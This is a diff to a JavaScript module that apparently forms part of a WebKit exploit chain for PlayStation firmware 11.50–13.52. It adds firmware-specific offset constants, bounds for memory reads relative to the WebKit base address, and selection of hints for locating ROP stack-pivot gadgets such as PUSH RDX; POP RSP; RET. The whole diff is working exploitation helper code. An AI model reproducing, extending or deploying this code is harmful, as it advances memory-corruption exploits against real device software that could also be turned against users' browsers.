@@ -29,6 +29,62 @@ export const PIVOT_HW_1352 = {
 /** Stable G5−G0 offset in libSceNKWebKit (11.50–13.00 decrypted modules) */
 export const G5_DELTA_FROM_G0 = 0x15d362;
 
+/** G5 − expm1 on 13.00 decrypted module (scan hint on 13.52 low .text) */
+export const G5_EXPM1_DELTA = 0x53642a;
+
+export const WEBKIT_RVA_PAD = 0x100000;
+export const WEBKIT_RVA_PROBE_KEY = "wk-rva-max";
+
+function isWebkitCodeRvaKey(k, v) {
+    if (typeof v !== "number" || v < 0x10000 || v >= 0x4000000) return false;
+    if (k === "fw_status" || k === "alias_of" || k === "pivot_view_sp") return false;
+    if (k.startsWith("wk___imp") || k.startsWith("k_")) return false;
+    if (k.indexOf("m_") >= 0 || k.indexOf("ArrayBuffer") >= 0 || k.indexOf("JSFunction") >= 0)
+        return false;
+    return true;
+}
+
+/** Highest known code RVA from offset tables + pad (excludes IAT/data — those OOM on 13.52). */
+export function webkitRvaMaxFromOff(off) {
+    let max = 0x100000;
+    const bags = [off, PIVOT_HW_1352, PIVOT_HINTS_1300];
+    for (let b = 0; b < bags.length; b++) {
+        const src = bags[b];
+        if (!src) continue;
+        for (const k of Object.keys(src)) {
+            const v = src[k];
+            if (isWebkitCodeRvaKey(k, v) && v > max) max = v;
+        }
+    }
+    return max + WEBKIT_RVA_PAD;
+}
+
+export function saveWebkitRvaProbe(rva) {
+    try { sessionStorage.setItem(WEBKIT_RVA_PROBE_KEY, rva.toString(16)); } catch (_) { }
+}
+
+/** Safe upper bound for webkitBase+RVA reads/scans on 13.52 (HW probe may tighten). */
+export function webkitRvaMax(off) {
+    let max = webkitRvaMaxFromOff(off);
+    try {
+        if (typeof sessionStorage !== "undefined") {
+            const probed = parseInt(sessionStorage.getItem(WEBKIT_RVA_PROBE_KEY), 16);
+            if (probed > 0x10000 && probed + WEBKIT_RVA_PAD < max) max = probed + WEBKIT_RVA_PAD;
+        }
+    } catch (_) { }
+    return max;
+}
+
+export function g5RvaSafe(rva, off) {
+    return rva >= 0x10000 && rva <= webkitRvaMax(off);
+}
+
+export function g5Expm1Hint(off) {
+    const e = off && off.wk_expm1_builtin;
+    if (!e) return 0;
+    return e + G5_EXPM1_DELTA;
+}
+
 export function g5DerivedHint(found) {
     const g0 = (found && found.wk_MOV_RDI_RSI_30_CALL != null)
         ? found.wk_MOV_RDI_RSI_30_CALL
@@ -45,15 +101,17 @@ export function pivotHint(key) {
 }
 
 /** Pick scan hint for hit selection — prefer HW/low, else cluster of known pivot RVAs */
-export function pivotScanHint(key, found, lowMax) {
+export function pivotScanHint(key, found, scanMax, off) {
     const hw = PIVOT_HW_1352[key];
-    if (hw != null && hw < lowMax) return hw;
+    if (hw != null && hw < scanMax) return hw;
     if (key === "wk_PUSH_RDX_POP_RSP_RET") {
+        const expm1 = g5Expm1Hint(off || found);
+        if (expm1 > 0 && expm1 < scanMax) return expm1;
         const derived = g5DerivedHint(found);
-        if (derived > 0 && derived < lowMax) return derived;
+        if (derived > 0 && derived < scanMax) return derived;
     }
     const table = pivotHint(key);
-    if (table > 0 && table < lowMax) return table;
+    if (table > 0 && table < scanMax) return table;
     const known = [];
     for (let i = 0; i < PIVOT_ROWS.length; i++) {
         const k = PIVOT_ROWS[i][1];
